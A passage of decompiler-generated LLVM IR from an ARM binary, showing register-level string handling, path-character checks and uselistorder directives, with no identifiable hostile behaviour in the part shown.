  %v0_9ba0 = load i32, i32* @r4, align 4
  %v2_9ba0 = add i32 %v0_9ba0, %v2_9b98
  store i32 %v2_9ba0, i32* @r0, align 4
  %v2_9ba4 = inttoptr i32 %v2_9ba0 to i8*
  %v3_9ba4 = call i32 @function_12398(i8* %v2_9ba4, i32 ptrtoint (i32* @global_var_1980c.51 to i32))
  store i32 %v3_9ba4, i32* %r0.global-to-local, align 4
  %v0_9ba8 = load i32, i32* @r5, align 4
  %v1_9ba8 = add i32 %v0_9ba8, 3
  store i32 %v1_9ba8, i32* @r5, align 4
  %v0_9bac = load i32, i32* @sl, align 4
  %v1_9bac = add i32 %v0_9bac, 660
  %v2_9bac = inttoptr i32 %v1_9bac to i32*
  %v3_9bac = load i32, i32* %v2_9bac, align 4
  %v0_9bb0 = load i32, i32* @r7, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v1_9ba8
  store i32 %v2_9bb0, i32* @r6, align 4
  %v2_9bb4 = sub i32 %v3_9bac, %v1_9ba8
  store i32 %v2_9bb4, i32* %r1.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r8, align 4
  store i32 %v0_9bb8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19808.48 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9bb0, i32* %r0.global-to-local, align 4
  %v4_9bc4 = call i32 @function_12428(i32 %v2_9bb0, i32 %v2_9bb4, i32 ptrtoint (i32* @global_var_19808.48 to i32), i32 %v0_9bb8)
  store i32 %v4_9bc4, i32* %r0.global-to-local, align 4
  %v0_9bc8 = load i32, i32* @sl, align 4
  %v1_9bc8 = add i32 %v0_9bc8, 16
  %v2_9bc8 = inttoptr i32 %v1_9bc8 to i32*
  %v3_9bc8 = load i32, i32* %v2_9bc8, align 4
  %v1_9bcc = and i32 %v3_9bc8, 33554432
  %v2_9bcc = icmp ne i32 %v1_9bcc, 0
  store i1 %v2_9bcc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bcc = mul i32 %v3_9bc8, 128
  %v0_9bd0 = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v0_9bd0, %v4_9bc4
  %v1_9bd4 = add i32 %v3_9bcc, 1472
  %v0_9bd8 = load i32, i32* @sb, align 4
  %v2_9bd8 = add i32 %v1_9bd4, %v0_9bd8
  store i32 %v2_9bd8, i32* @r4, align 4
  %v2_9bdc = add i32 %v2_9bd0, %v0_9bd8
  store i32 %v2_9bdc, i32* @r5, align 4
  store i32 %v2_9bd8, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @fp, align 4
  %v1_9be4 = trunc i32 %v0_9be4 to i8
  %v3_9be4 = add i32 %v2_9bdc, 2115
  %v4_9be4 = inttoptr i32 %v3_9be4 to i8*
  store i8 %v1_9be4, i8* %v4_9be4, align 1
  %v1_9be8 = inttoptr i32 %v2_9bd8 to i8*
  %v2_9be8 = call i32 @function_12370(i8* %v1_9be8)
  %v0_9bec = load i32, i32* @r6, align 4
  store i32 %v0_9bec, i32* %r1.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @r4, align 4
  %v2_9bf0 = add i32 %v0_9bf0, %v2_9be8
  store i32 %v2_9bf0, i32* @r0, align 4
  %v2_9bf4 = inttoptr i32 %v2_9bf0 to i8*
  %v3_9bf4 = call i32 @function_12398(i8* %v2_9bf4, i32 %v0_9bec)
  store i32 %v3_9bf4, i32* %r0.global-to-local, align 4
  %v0_9bf8 = load i32, i32* @sl, align 4
  %v1_9bf8 = add i32 %v0_9bf8, 16
  %v2_9bf8 = inttoptr i32 %v1_9bf8 to i32*
  %v3_9bf8 = load i32, i32* %v2_9bf8, align 4
  %v1_9bfc = add i32 %v3_9bf8, 1
  store i32 %v1_9bfc, i32* %r3.global-to-local, align 4
  store i32 %v1_9bfc, i32* %v2_9bf8, align 4
  br label %dec_label_pc_9a00

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9a74, %bb196
  %v2_9c0c = phi i32 [ %v1_9a64, %bb196 ], [ %v2_9a88, %dec_label_pc_9a74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9c0c = inttoptr i32 %v2_9c0c to i8*
  store i8 0, i8* %v3_9c0c, align 1
  br label %dec_label_pc_9a9c

dec_label_pc_9c14:                                ; preds = %dec_label_pc_98e4
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c20 = load i32, i32* @r6, align 4
  %v1_9c20 = add i32 %v0_9c20, 4
  %v2_9c20 = inttoptr i32 %v1_9c20 to i8*
  %v3_9c20 = load i8, i8* %v2_9c20, align 1
  %v4_9c20 = zext i8 %v3_9c20 to i32
  store i32 %v4_9c20, i32* %r3.global-to-local, align 4
  %v2_9c24 = icmp ugt i8 %v3_9c20, 114
  store i1 %v2_9c24, i1* %cpsr_c.global-to-local, align 1
  %v7_9c24 = icmp eq i8 %v3_9c20, 115
  store i1 %v7_9c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c24, label %bb201, label %.thread44

bb201:                                            ; preds = %dec_label_pc_9c14
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9c14, %bb201
  %v3_9c34 = phi i32 [ 7, %dec_label_pc_9c14 ], [ 8, %bb201 ]
  %v1_9c38 = sub nsw i32 1, %v3_9c34
  %v1_9c3c = load i32, i32* @r7, align 4
  %v2_9c3c = add i32 %v1_9c3c, %v1_9c38
  store i32 %v2_9c3c, i32* %r2.global-to-local, align 4
  %v2_9c40 = add i32 %v3_9c34, %v0_9c20
  store i32 %v2_9c40, i32* %r1.global-to-local, align 4
  store i32 %v0_9c20, i32* %r0.global-to-local, align 4
  %v3_9c48 = inttoptr i32 %v0_9c20 to i8*
  %v4_9c48 = call i32 @function_15448(i8* %v3_9c48, i32 %v2_9c40, i32 %v2_9c3c)
  store i32 %v4_9c48, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9c58 = load i32, i32* @r5, align 4
  %v1_9c58 = load i32, i32* @r4, align 4
  %v2_9c58 = add i32 %v1_9c58, %v0_9c58
  %v3_9c58 = inttoptr i32 %v2_9c58 to i8*
  %v4_9c58 = load i8, i8* %v3_9c58, align 1
  %v6_9c58 = zext i8 %v4_9c58 to i32
  store i32 %v6_9c58, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9c5c = icmp eq i8 %v4_9c58, 0
  store i1 %v9_9c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c5c, label %dec_label_pc_9c9c, label %dec_label_pc_9c64

dec_label_pc_9c64:                                ; preds = %.thread44
  %v2_9c64 = icmp ugt i8 %v4_9c58, 46
  store i1 %v2_9c64, i1* %cpsr_c.global-to-local, align 1
  %v7_9c64 = icmp eq i8 %v4_9c58, 47
  store i1 %v7_9c64, i1* %cpsr_z.global-to-local, align 1
  %v1_9c68 = load i32, i32* @r6, align 4
  br i1 %v7_9c64, label %bb202, label %dec_label_pc_9c70

bb202:                                            ; preds = %dec_label_pc_9c64
  store i32 %v1_9c68, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d1c

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c64
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9c80

dec_label_pc_9c78:                                ; preds = %dec_label_pc_9c80
  %v2_9c78 = icmp ugt i8 %v4_9c8c, 46
  store i1 %v2_9c78, i1* %cpsr_c.global-to-local, align 1
  %v7_9c78 = icmp eq i8 %v4_9c8c, 47
  store i1 %v7_9c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c78, label %dec_label_pc_9d1c, label %dec_label_pc_9c80

dec_label_pc_9c80:                                ; preds = %dec_label_pc_9c78, %dec_label_pc_9c70
  %v0_9c80 = phi i32 [ %v1_9c80, %dec_label_pc_9c78 ], [ 0, %dec_label_pc_9c70 ]
  %v1_9c80 = add i32 %v0_9c80, 1
  store i32 %v1_9c80, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  store i32 %v1_9c80, i32* %stack_var_-44, align 4
  %v2_9c8c = add i32 %v1_9c80, %v1_9c68
  %v3_9c8c = inttoptr i32 %v2_9c8c to i8*
  %v4_9c8c = load i8, i8* %v3_9c8c, align 1
  %v6_9c8c = zext i8 %v4_9c8c to i32
  store i32 %v6_9c8c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c90 = icmp eq i8 %v4_9c8c, 0
  store i1 %v2_9c90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9c8c, i32* %r2.global-to-local, align 4
  br i1 %v2_9c90, label %dec_label_pc_9c9c, label %dec_label_pc_9c78

dec_label_pc_9c9c:                                ; preds = %dec_label_pc_9c80, %.thread44, %dec_label_pc_9d1c
  %v0_9c9c = load i32, i32* @r6, align 4
  store i32 %v0_9c9c, i32* %r0.global-to-local, align 4
  %v1_9ca0 = inttoptr i32 %v0_9c9c to i8*
  %v2_9ca0 = call i32 @function_12370(i8* %v1_9ca0)
  store i32 %v2_9ca0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ca4 = icmp eq i32 %v2_9ca0, 0
  store i1 %v2_9ca4, i1* %cpsr_z.global-to-local, align 1
  %tmp203 = icmp slt i32 %v2_9ca0, 1
  br i1 %tmp203, label %dec_label_pc_9cbc, label %dec_label_pc_9cac

dec_label_pc_9cac:                                ; preds = %dec_label_pc_9c9c
  %v0_9cac = load i32, i32* @r6, align 4
  store i32 %v0_9cac, i32* %r0.global-to-local, align 4
  %v1_9cb0 = inttoptr i32 %v0_9cac to i8*
  %v2_9cb0 = call i32 @function_12370(i8* %v1_9cb0)
  store i32 %v2_9cb0, i32* %r0.global-to-local, align 4
  %v2_9cb4 = icmp ugt i32 %v2_9cb0, 126
  store i1 %v2_9cb4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb4 = icmp eq i32 %v2_9cb0, 127
  store i1 %v7_9cb4, i1* %cpsr_z.global-to-local, align 1
  %v7_9cb8 = icmp slt i32 %v2_9cb0, 128
  br i1 %v7_9cb8, label %dec_label_pc_9e6c, label %dec_label_pc_9cbc

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cac, %dec_label_pc_9c9c, %dec_label_pc_9e6c
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9cc0 = load i32, i32* %stack_var_-44, align 4
  %v0_9cc4 = load i32, i32* @r6, align 4
  %v1_9cc4 = add i32 %v0_9cc4, 1
  store i32 %v1_9cc4, i32* @r5, align 4
  %v2_9cc8 = add i32 %v1_9cc4, %v3_9cc0
  store i32 %v2_9cc8, i32* %r0.global-to-local, align 4
  %v1_9ccc = inttoptr i32 %v2_9cc8 to i8*
  %v2_9ccc = call i32 @function_12370(i8* %v1_9ccc)
  store i32 %v2_9ccc, i32* %r0.global-to-local, align 4
  %v2_9cd0 = icmp ugt i32 %v2_9ccc, 254
  store i1 %v2_9cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cd0 = icmp eq i32 %v2_9ccc, 255
  store i1 %v7_9cd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9cd4 = icmp sgt i32 %v2_9ccc, 255
  br i1 %v8_9cd4, label %dec_label_pc_991c, label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9cbc
  %v0_9cd8 = load i32, i32* @sb, align 4
  %v1_9cdc = add i32 %v0_9cd8, 533
  store i32 %v1_9cdc, i32* @r4, align 4
  store i32 %v1_9cdc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9ce8 = call i32 @function_12404(i32 %v1_9cdc, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9cf0 = load i32, i32* %stack_var_-44, align 4
  %v0_9cf4 = load i32, i32* @r5, align 4
  %v2_9cf4 = add i32 %v0_9cf4, %v3_9cf0
  store i32 %v2_9cf4, i32* %r0.global-to-local, align 4
  %v1_9cf8 = inttoptr i32 %v2_9cf4 to i8*
  %v2_9cf8 = call i32 @function_12370(i8* %v1_9cf8)
  store i32 %v2_9cf8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cfc = icmp eq i32 %v2_9cf8, 0
  store i1 %v2_9cfc, i1* %cpsr_z.global-to-local, align 1
  %tmp204 = icmp slt i32 %v2_9cf8, 1
  br i1 %tmp204, label %dec_label_pc_991c, label %dec_label_pc_9d04

dec_label_pc_9d04:                                ; preds = %dec_label_pc_9cd8
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d08 = load i32, i32* %stack_var_-44, align 4
  %v0_9d0c = load i32, i32* @r4, align 4
  store i32 %v0_9d0c, i32* @r0, align 4
  %v0_9d10 = load i32, i32* @r5, align 4
  %v2_9d10 = add i32 %v0_9d10, %v3_9d08
  store i32 %v2_9d10, i32* %r1.global-to-local, align 4
  %v2_9d14 = inttoptr i32 %v0_9d0c to i8*
  %v3_9d14 = call i32 @function_12398(i8* %v2_9d14, i32 %v2_9d10)
  store i32 %v3_9d14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_991c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9c78, %bb202
  %v2_9d20 = phi i32 [ %v1_9c68, %bb202 ], [ %v2_9c8c, %dec_label_pc_9c78 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d20 = inttoptr i32 %v2_9d20 to i8*
  store i8 0, i8* %v3_9d20, align 1
  br label %dec_label_pc_9c9c

dec_label_pc_9d28:                                ; preds = %dec_label_pc_989c
  %v1_9d28 = add i32 %v0_9d28, 1
  store i32 %v1_9d28, i32* %ip.global-to-local, align 4
  %v2_9d2c = add i32 %v0_989c, %v1_9d28
  store i32 %v2_9d2c, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v1_9d28, i32* %stack_var_-44, align 4
  %v1_9d3c = inttoptr i32 %v2_9d2c to i8*
  %v2_9d3c = call i32 @function_12370(i8* %v1_9d3c)
  store i32 %v2_9d3c, i32* %r0.global-to-local, align 4
  %v0_9d40 = load i32, i32* %r4.global-to-local, align 4
  %v2_9d40 = add i32 %v0_9d40, %v2_9d3c
  store i32 %v2_9d40, i32* @r4, align 4
  %v1_9d44 = add i32 %v2_9d40, -1
  %v2_9d44 = inttoptr i32 %v1_9d44 to i8*
  %v3_9d44 = load i8, i8* %v2_9d44, align 1
  %v4_9d44 = zext i8 %v3_9d44 to i32
  store i32 %v4_9d44, i32* %r3.global-to-local, align 4
  %v2_9d48 = icmp ugt i8 %v3_9d44, 33
  store i1 %v2_9d48, i1* %cpsr_c.global-to-local, align 1
  %v7_9d48 = icmp eq i8 %v3_9d44, 34
  store i1 %v7_9d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d48, label %dec_label_pc_9d50, label %dec_label_pc_98a8

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d28
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i32, i32* %stack_var_-44, align 4
  %v0_9d58 = load i32, i32* @r5, align 4
  %v2_9d58 = add i32 %v0_9d58, %v3_9d54
  store i32 %v2_9d58, i32* %r4.global-to-local, align 4
  store i32 %v2_9d58, i32* %r0.global-to-local, align 4
  %v1_9d60 = inttoptr i32 %v2_9d58 to i8*
  %v2_9d60 = call i32 @function_12370(i8* %v1_9d60)
  store i32 %v2_9d60, i32* %r0.global-to-local, align 4
  %v2_9d64 = add i32 %v2_9d58, %v2_9d60
  store i32 %v2_9d64, i32* @r4, align 4
  %v0_9d68 = load i32, i32* @r6, align 4
  %v1_9d68 = trunc i32 %v0_9d68 to i8
  %v3_9d68 = add i32 %v2_9d64, -1
  %v4_9d68 = inttoptr i32 %v3_9d68 to i8*
  store i8 %v1_9d68, i8* %v4_9d68, align 1
  br label %dec_label_pc_98a8

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9910
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9d74 = load i32, i32* %stack_var_-44, align 4
  %v0_9d78 = load i32, i32* @r6, align 4
  %v1_9d78 = add i32 %v0_9d78, 1
  store i32 %v1_9d78, i32* @r5, align 4
  %v2_9d7c = add i32 %v1_9d78, %v3_9d74
  store i32 %v2_9d7c, i32* %r0.global-to-local, align 4
  %v1_9d80 = inttoptr i32 %v2_9d7c to i8*
  %v2_9d80 = call i32 @function_12370(i8* %v1_9d80)
  store i32 %v2_9d80, i32* %r0.global-to-local, align 4
  %v2_9d84 = icmp ugt i32 %v2_9d80, 254
  store i1 %v2_9d84, i1* %cpsr_c.global-to-local, align 1
  %v7_9d84 = icmp eq i32 %v2_9d80, 255
  store i1 %v7_9d84, i1* %cpsr_z.global-to-local, align 1
  %v8_9d88 = icmp sgt i32 %v2_9d80, 255
  br i1 %v8_9d88, label %dec_label_pc_991c, label %dec_label_pc_9d8c

dec_label_pc_9d8c:                                ; preds = %dec_label_pc_9d70
  %v0_9d8c = load i32, i32* @sb, align 4
  %v1_9d90 = add i32 %v0_9d8c, 533
  store i32 %v1_9d90, i32* @r4, align 4
  store i32 %v1_9d90, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d9c = call i32 @function_12404(i32 %v1_9d90, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9da4 = load i32, i32* %stack_var_-44, align 4
  %v0_9da8 = load i32, i32* @r5, align 4
  %v2_9da8 = add i32 %v0_9da8, %v3_9da4
  store i32 %v2_9da8, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da8 to i8*
  %v2_9dac = call i32 @function_12370(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9db0 = icmp eq i32 %v2_9dac, 0
  store i1 %v2_9db0, i1* %cpsr_z.global-to-local, align 1
  %tmp205 = icmp slt i32 %v2_9dac, 1
  br i1 %tmp205, label %dec_label_pc_991c, label %dec_label_pc_9db8

dec_label_pc_9db8:                                ; preds = %dec_label_pc_9d8c
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  %v0_9dc0 = load i32, i32* @r4, align 4
  store i32 %v0_9dc0, i32* @r0, align 4
  %v0_9dc4 = load i32, i32* @r5, align 4
  %v2_9dc4 = add i32 %v0_9dc4, %v3_9dbc
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dc8 = inttoptr i32 %v0_9dc0 to i8*
  %v3_9dc8 = call i32 @function_12398(i8* %v2_9dc8, i32 %v2_9dc4)
  store i32 %v3_9dc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_991c

dec_label_pc_9dd0:                                ; preds = %dec_label_pc_8498
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9dd4 = call i32 @function_11ad8(i32 50)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v3_9de0 = call i32 @function_11a14(i32 50, i32* null)
  store i32 %v3_9de0, i32* %r1.global-to-local, align 4
  %v0_9de8 = load i32, i32* @r5, align 4
  %v1_9de8 = add i32 %v0_9de8, 20
  store i32 %v1_9de8, i32* @r0, align 4
  %v2_9dec = inttoptr i32 %v1_9de8 to i8*
  %v3_9dec = call i32 @function_12398(i8* %v2_9dec, i32 %v3_9de0)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_9df4 = call i32 @function_11a38(i32 50)
  store i32 %v1_9df4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_8498, %dec_label_pc_9ed8, %dec_label_pc_9eac, %dec_label_pc_9e80, %dec_label_pc_9e40, %dec_label_pc_9dd0
  %v0_9df8 = load i32, i32* @r7, align 4
  store i32 %v0_9df8, i32* %r1.global-to-local, align 4
  %v0_9dfc = load i32, i32* @fp, align 4
  store i32 %v0_9dfc, i32* @r0, align 4
  %v2_9e00 = inttoptr i32 %v0_9dfc to i8*
  %v3_9e00 = call i32 @function_12398(i8* %v2_9e00, i32 %v0_9df8)
  store i32 %v3_9e00, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r1.global-to-local, align 4
  %v0_9e08 = load i32, i32* @sb, align 4
  %v1_9e08 = add i32 %v0_9e08, 1
  store i32 %v1_9e08, i32* @sb, align 4
  %v0_9e0c = load i32, i32* @r5, align 4
  %v3_9e10 = icmp uge i32 %v1_9e08, %v0_839c
  store i1 %v3_9e10, i1* %cpsr_c.global-to-local, align 1
  %v9_9e10 = icmp eq i32 %v1_9e08, %v0_839c
  store i1 %v9_9e10, i1* %cpsr_z.global-to-local, align 1
  %v1_9e14 = add i32 %v0_9e0c, 3140
  store i32 %v1_9e14, i32* @r5, align 4
  br i1 %v9_9e10, label %dec_label_pc_9e1c, label %dec_label_pc_83cc

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_9df8
  %v1_9e2c = add i32 %v2_83b0, 1452
  store i32 %v1_9e2c, i32* %r2.global-to-local, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_84f4.preheader

dec_label_pc_9e40:                                ; preds = %dec_label_pc_8498
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e44 = call i32 @function_11ad8(i32 51)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v3_9e50 = call i32 @function_11a14(i32 51, i32* null)
  store i32 %v3_9e50, i32* %r1.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v1_9e58 = add i32 %v0_9e58, 20
  store i32 %v1_9e58, i32* @r0, align 4
  %v2_9e5c = inttoptr i32 %v1_9e58 to i8*
  %v3_9e5c = call i32 @function_12398(i8* %v2_9e5c, i32 %v3_9e50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9e64 = call i32 @function_11a38(i32 51)
  store i32 %v1_9e64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9e6c:                                ; preds = %dec_label_pc_9cac
  %v0_9e6c = load i32, i32* @sb, align 4
  %v0_9e70 = load i32, i32* @r6, align 4
  store i32 %v0_9e70, i32* %r1.global-to-local, align 4
  %v1_9e74 = add i32 %v0_9e6c, 789
  store i32 %v1_9e74, i32* @r0, align 4
  %v2_9e78 = inttoptr i32 %v1_9e74 to i8*
  %v3_9e78 = call i32 @function_12398(i8* %v2_9e78, i32 %v0_9e70)
  store i32 %v3_9e78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cbc

dec_label_pc_9e80:                                ; preds = %dec_label_pc_8498
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9e84 = call i32 @function_11ad8(i32 48)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v3_9e90 = call i32 @function_11a14(i32 48, i32* null)
  store i32 %v3_9e90, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r5, align 4
  %v1_9e98 = add i32 %v0_9e98, 20
  store i32 %v1_9e98, i32* @r0, align 4
  %v2_9e9c = inttoptr i32 %v1_9e98 to i8*
  %v3_9e9c = call i32 @function_12398(i8* %v2_9e9c, i32 %v3_9e90)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9ea4 = call i32 @function_11a38(i32 48)
  store i32 %v1_9ea4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9eac:                                ; preds = %dec_label_pc_8498
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9eb0 = call i32 @function_11ad8(i32 47)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9ebc = call i32 @function_11a14(i32 47, i32* null)
  store i32 %v3_9ebc, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  %v1_9ec4 = add i32 %v0_9ec4, 20
  store i32 %v1_9ec4, i32* @r0, align 4
  %v2_9ec8 = inttoptr i32 %v1_9ec4 to i8*
  %v3_9ec8 = call i32 @function_12398(i8* %v2_9ec8, i32 %v3_9ebc)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9ed0 = call i32 @function_11a38(i32 47)
  store i32 %v1_9ed0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9ed8:                                ; preds = %dec_label_pc_8498
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9edc = call i32 @function_11ad8(i32 49)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v3_9ee8 = call i32 @function_11a14(i32 49, i32* null)
  store i32 %v3_9ee8, i32* %r1.global-to-local, align 4
  %v0_9ef0 = load i32, i32* @r5, align 4
  %v1_9ef0 = add i32 %v0_9ef0, 20
  store i32 %v1_9ef0, i32* @r0, align 4
  %v2_9ef4 = inttoptr i32 %v1_9ef0 to i8*
  %v3_9ef4 = call i32 @function_12398(i8* %v2_9ef4, i32 %v3_9ee8)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9efc = call i32 @function_11a38(i32 49)
  store i32 %v1_9efc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9df8

; uselistorder directives
  uselistorder i32 %v2_9e30, { 1, 0 }
  uselistorder i32 %v1_9e2c, { 1, 0 }
  uselistorder i32 %v1_9e14, { 1, 0 }
  uselistorder i32 %v1_9d28, { 1, 0, 2 }
  uselistorder i8 %v4_9c8c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9c80, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9c78, { 1, 0 }
  uselistorder i32 %v1_9c68, { 1, 0, 2 }
  uselistorder i1 %v7_9c64, { 1, 0 }
  uselistorder i1 %v9_9c5c, { 1, 0 }
  uselistorder i32 %v0_9c20, { 2, 1, 0, 3 }
  uselistorder i32 %v2_9bb0, { 1, 0, 2 }
  uselistorder i32 %v1_9ba8, { 1, 0, 2 }
  uselistorder i32 %v1_9b3c, { 0, 2, 1 }
  uselistorder i32 %v0_9b3c, { 0, 2, 1 }
  uselistorder i32 %v2_9ab0, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9a90, { 1, 0 }
  uselistorder i8 %v4_9a88, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9a90, { 1, 0, 3, 2 }
  uselistorder i1 %v7_9a74, { 1, 0 }
  uselistorder i32 %v1_9a64, { 1, 0, 2 }
  uselistorder i1 %v7_9a60, { 1, 0 }
  uselistorder i32 %v0_9a20, { 2, 0, 1, 3 }
  uselistorder i32 %v3_99e4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_99c8, { 1, 0, 2 }
  uselistorder i32 %v4_99c0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d8, { 1, 0 }
  uselistorder i32 %v0_989c, { 1, 0 }
  uselistorder i32 %v0_9d28, { 1, 0 }
  uselistorder i1 %v7_9858, { 1, 0 }
  uselistorder i32 %v0_9840, { 1, 0 }
  uselistorder i32 %v2_9834, { 1, 0, 2 }
  uselistorder i32 %v1_9800, { 1, 0 }
  uselistorder i32 %v0_97e8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_9798, { 1, 0 }
  uselistorder i32 %v5_9794, { 1, 5, 4, 2, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_977c.v4_9764, { 1, 0, 2 }
  uselistorder i1 %v7_9740, { 1, 0 }
  uselistorder i32 %v1_9668, { 1, 0, 2 }
  uselistorder i32 %v1_9660, { 1, 0 }
  uselistorder i1 %v7_9648, { 1, 0 }
  uselistorder i32 %v5_9644, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_962c.v4_9614, { 1, 0, 2 }
  uselistorder i1 %v7_95f4, { 1, 0 }
  uselistorder i32 %v0_9538, { 1, 0 }
  uselistorder i32 %v0_9520, { 1, 0 }
  uselistorder i32 %v0_9524, { 1, 0 }
  uselistorder i32 %v1_94fc, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_94c8, { 1, 0 }
  uselistorder i1 %v7_9490, { 0, 2, 1 }
  uselistorder i32 %v1_94b4, { 1, 0 }
  uselistorder i32 %v3_94ac, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_94a0, { 1, 0 }
  uselistorder i1 %v7_9414, { 1, 0 }
  uselistorder i32 %v5_9410, { 1, 5, 3, 4, 2, 0, 6, 7 }
  uselistorder i32 %v2_93f8, { 1, 0, 2 }
  uselistorder i32 %v2_93f4, { 1, 0, 2 }
  uselistorder i32 %v1_93e0, { 0, 2, 1 }
  uselistorder i32 %v4_93d8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_93a8, { 1, 0 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v5_933c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9324.v4_930c, { 1, 0, 2 }
  uselistorder i1 %v7_92dc, { 1, 0 }
  uselistorder i1 %v7_9268, { 1, 0 }
